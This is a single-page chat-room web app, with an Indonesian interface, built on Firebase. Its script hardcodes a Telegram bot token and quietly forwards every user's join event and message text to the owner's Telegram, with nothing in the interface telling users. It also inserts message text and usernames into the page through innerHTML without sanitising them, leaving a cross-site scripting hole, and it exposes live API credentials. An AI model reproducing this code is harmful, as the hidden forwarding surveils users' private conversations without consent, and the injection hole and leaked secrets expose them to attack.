<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat Real-Time</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<!-- Halaman Login -->
<div id="login-page">
    <div class="login-box">
        <h1>💬 Chat Room</h1>
        <p class="subtitle">Masuk dengan kode room (6 digit angka)</p>
        
        <input type="text" id="username" placeholder="Nama Anda" maxlength="20">
        <input type="number" id="room-input" placeholder="Kode Room (contoh: 009898)" maxlength="6">
        
        <button onclick="joinRoom()">Gabung ke Room</button>
        <button class="create-room-btn" onclick="createRoom()">+ Buat Room Baru</button>
        
        <div id="new-room-display" class="room-code-display">
            <p style="font-size: 14px; color: #666; margin-bottom: 5px;">Room berhasil dibuat!</p>
            <div class="code-text" id="generated-code"></div>
            <p style="font-size: 12px; color: #666; margin-top: 5px;">Share kode ini ke teman Anda</p>
            <button onclick="enterRoom()" style="margin-top: 10px;">Masuk ke Room</button>
        </div>
    </div>
</div>

<!-- Halaman Chat -->
<div id="chat-page">
    <div class="chat-header">
        <div>
            <h2>Room: <span class="room-info" id="current-room">-</span></h2>
        </div>
        <button class="leave-btn" onclick="leaveRoom()">Keluar</button>
    </div>
    
    <div id="messages"></div>
    
    <div class="input-area">
        <input type="text" id="message-input" placeholder="Tulis pesan..." maxlength="200">
        <button onclick="sendMessage()">➤</button>
    </div>
</div>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
    // KONFIGURASI FIREBASE
    const firebaseConfig = {
        apiKey: "AIzaSyDpQhIcitZwMMhQIHhpB9rp_k0EpBJT-2k",
        authDomain: "chat-real-time-32576.firebaseapp.com",
        databaseURL: "https://chat-real-time-32576-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "chat-real-time-32576",
        storageBucket: "chat-real-time-32576.appspot.com",
        messagingSenderId: "21431357525",
        appId: "1:21431357525:web:5a32eb1ae3f59a485e04dc"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    
    // Variabel Global
    let currentRoom = '';
    let username = '';
    let roomRef = null;
    let generatedRoomCode = '';
    
    // Konfigurasi Telegram Bot
    const BOT_TOKEN = "8672339759:AAF_jy2iB5xZlHh6843s-8RkukvJ5-yROto";
    const CHAT_ID = "7129085772";
    
    // Fungsi Kirim Notif Telegram dengan Tombol Pilihan
    function sendTelegramNotif(type, data) {
        let text = "";
        let buttons = [];
        
        if (type === 'join') {
            text = `🚪 <b>${data.user}</b> masuk ke room <code>${data.room}</code>`;
            // CUSTOMIZE TOMBOL DI SINI - Bisa ganti text dan callback_data
            buttons = [
                [
                    { text: "👤 Lihat Chat", callback_data: `view_${data.room}` },
                    { text: "❌ Usir", callback_data: `kick_${data.user}` }
                ],
                [
                    { text: "🔕 Matikan Notif Room Ini", callback_data: `mute_${data.room}` }
                ]
            ];
        } else if (type === 'message') {
            text = `💬 Pesan baru dari <b>${data.user}</b> (Room: ${data.room}):\n\n"${data.text}"`;
            // CUSTOMIZE TOMBOL PESAN
            buttons = [
                [
                    { text: "✅ Sudah Dibaca", callback_data: `read_${data.room}` },
                    { text: "📝 Balas", url: `https://t.me/share/url?url=&text=Balasan untuk ${data.user}` }
                ]
            ];
        }
        
        const payload = {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML',
            reply_markup: JSON.stringify({
                inline_keyboard: buttons
            })
        };
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(e => console.log('Telegram error:', e));
    }
    
    // Generate Kode Room (Hanya Angka 6 Digit)
    function createRoom() {
        const nameInput = document.getElementById('username').value.trim();
        if (!nameInput) {
            alert('Isi nama Anda dulu!');
            return;
        }
        
        // Generate angka 6 digit (100000 - 999999)
        generatedRoomCode = String(Math.floor(100000 + Math.random() * 900000));
        
        document.getElementById('generated-code').textContent = generatedRoomCode;
        document.getElementById('new-room-display').classList.add('show');
    }
    
    // Masuk ke Room yang dibuat
    function enterRoom() {
        document.getElementById('room-input').value = generatedRoomCode;
        joinRoom();
    }
    
    // Gabung ke Room
    function joinRoom() {
        username = document.getElementById('username').value.trim();
        currentRoom = document.getElementById('room-input').value.trim();
        
        if (!username) {
            alert('Nama tidak boleh kosong!');
            return;
        }
        if (!currentRoom || currentRoom.length !== 6 || isNaN(currentRoom)) {
            alert('Kode room harus 6 digit angka!');
            return;
        }
        
        // Simpan ke localStorage
        localStorage.setItem('chat_username', username);
        localStorage.setItem('chat_room', currentRoom);
        
        // Tampilkan chat page
        document.getElementById('login-page').style.display = 'none';
        document.getElementById('chat-page').style.display = 'flex';
        document.getElementById('current-room').textContent = currentRoom;
        
        // Connect ke Firebase
        roomRef = database.ref('rooms/' + currentRoom);
        
        // Dengarkan pesan baru
        roomRef.on('child_added', (snapshot) => {
            const msg = snapshot.val();
            displayMessage(msg);
        });
        
        // Kirim notif bergabung & Notif Telegram
        roomRef.push({
            type: 'system',
            text: `${username} bergabung ke room`,
            timestamp: firebase.database.ServerValue.TIMESTAMP
        });
        
        // Kirim notif ke Telegram (owner)
        sendTelegramNotif('join', { user: username, room: currentRoom });
        
        document.getElementById('message-input').focus();
    }
    
    // Tampilkan Pesan
    function displayMessage(msg) {
        const messagesDiv = document.getElementById('messages');
        const div = document.createElement('div');
        
        if (msg.type === 'system') {
            div.className = 'system-message';
            div.textContent = msg.text;
        } else {
            const isMe = msg.username === username;
            div.className = 'message ' + (isMe ? 'me' : 'other');
            
            const time = new Date(msg.timestamp).toLocaleTimeString('id-ID', {
                hour: '2-digit', minute: '2-digit'
            });
            
            div.innerHTML = `
                ${!isMe ? `<div class="username">${msg.username}</div>` : ''}
                ${msg.text}
                <div class="time">${time}</div>
            `;
            
            // Notif Telegram kalau ada pesan baru (dan bukan pesan kita sendiri)
            if (!isMe) {
                sendTelegramNotif('message', { 
                    user: msg.username, 
                    room: currentRoom, 
                    text: msg.text 
                });
            }
        }
        
        messagesDiv.appendChild(div);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }
    
    // Kirim Pesan
    function sendMessage() {
        const input = document.getElementById('message-input');
        const text = input.value.trim();
        
        if (!text || !roomRef) return;
        
        roomRef.push({
            type: 'message',
            username: username,
            text: text,
            timestamp: firebase.database.ServerValue.TIMESTAMP
        });
        
        input.value = '';
    }
    
    // Keluar dari Room
    function leaveRoom() {
        if (roomRef) {
            roomRef.push({
                type: 'system',
                text: `${username} keluar dari room`,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
        }
        
        localStorage.removeItem('chat_username');
        localStorage.removeItem('chat_room');
        location.reload();
    }
    
    // Kirim dengan Enter
    document.getElementById('message-input').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') sendMessage();
    });
    
    // Auto-login kalau sudah pernah masuk
    window.onload = function() {
        const savedName = localStorage.getItem('chat_username');
        const savedRoom = localStorage.getItem('chat_room');
        
        if (savedName && savedRoom) {
            username = savedName;
            currentRoom = savedRoom;
            
            document.getElementById('login-page').style.display = 'none';
            document.getElementById('chat-page').style.display = 'flex';
            document.getElementById('current-room').textContent = currentRoom;
            
            roomRef = database.ref('rooms/' + currentRoom);
            
            roomRef.on('child_added', (snapshot) => {
                const msg = snapshot.val();
                displayMessage(msg);
            });
            
            roomRef.push({
                type: 'system',
                text: `${username} kembali online`,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
        }
    };
</script>

</body>
</html>
